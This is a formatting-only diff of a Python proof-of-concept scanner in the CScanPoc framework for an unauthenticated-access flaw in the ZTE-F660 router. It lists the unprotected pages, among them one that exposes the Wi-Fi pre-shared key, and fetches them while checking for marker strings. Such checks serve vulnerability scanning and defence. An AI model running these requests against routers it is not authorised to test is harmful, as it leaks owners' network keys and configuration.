@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'ZTE_0011' # 平台漏洞编号，留空
+    vuln_id = 'ZTE_0011'  # 平台漏洞编号，留空
     name = 'ZTE-F660 未授权访问'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2014-07-01'  # 漏洞公布时间
     desc = '''
         status_dev_info_t.gch            不登录情况下直接获取路由信息
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     product = 'ZTE'  # 漏洞应用名称
     product_version = 'ZTE-F660'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'b5890666-2d38-402a-89e6-07d0be178a19'
     author = '47bwy'  # POC编写者
@@ -33,21 +35,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066850
+
+            # Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066850
             hh = hackhttp.hackhttp()
             payloads = [
-                ['/status_dev_info_t.gch','Frm_CarrierName'],
-                ['/manager_dev_config_t.gch','ConfigUpload'],
-                ['/wlan_security.gch','PreSharedKey'],
-                ['/manager_log_conf_t.gch','Transfer_meaning']
+                ['/status_dev_info_t.gch', 'Frm_CarrierName'],
+                ['/manager_dev_config_t.gch', 'ConfigUpload'],
+                ['/wlan_security.gch', 'PreSharedKey'],
+                ['/manager_log_conf_t.gch', 'Transfer_meaning']
             ]
-            for p  in payloads:
+            for p in payloads:
                 url = self.target + p[0]
-                code, head,res, errcode, _ = hh.http(url)
+                code, head, res, errcode, _ = hh.http(url)
 
                 if p[1] in res:
-                    #security_hole(url)
+                    # security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -56,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
